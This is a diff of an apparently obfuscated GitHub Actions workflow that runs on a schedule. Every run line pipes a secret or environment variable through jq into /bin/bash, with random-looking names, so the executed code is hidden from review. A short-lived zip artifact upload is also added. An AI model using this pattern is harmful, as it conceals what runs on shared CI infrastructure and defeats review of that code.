@@ -1,22 +1,28 @@
 name: biexizhendian
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '36 3/6 * * *'
 
-jobs:  # 2194
+  schedule:
+    - cron: '30 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: biexizhendian
         env:
-          dp4766: ${{ secrets.dp4766 }}
+          xwa92822: ${{ secrets.xwa92822 }}
         run: |
-          echo $dp4766 | jq -r .cezar39705 | /bin/bash
-          echo $f0379 | jq -r .wpsa66179 | /bin/bash
-          echo $thyw91 | jq -r .wm835 | /bin/bash
-          echo $t9 | jq -r .pay35 | /bin/bash
-          echo $a60 | jq -r .z1 | /bin/bash
+          printf '%s' "$xwa92822" | jq -r .dfm46761 | /bin/bash
+          printf '%s' "$mkpdr10" | jq -r .zar917 | /bin/bash
+          echo $bk403 | jq -r .x98 | /bin/bash
+          echo $z25 | jq -r .edqjv10185 | /bin/bash
+          printf '%s' "$udy227" | jq -r .tcb1150 | /bin/bash
+          echo $nyvs9 | jq -r .fbba09 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lDRu9kgF
+          path: "*.zip"
+          retention-days: 1
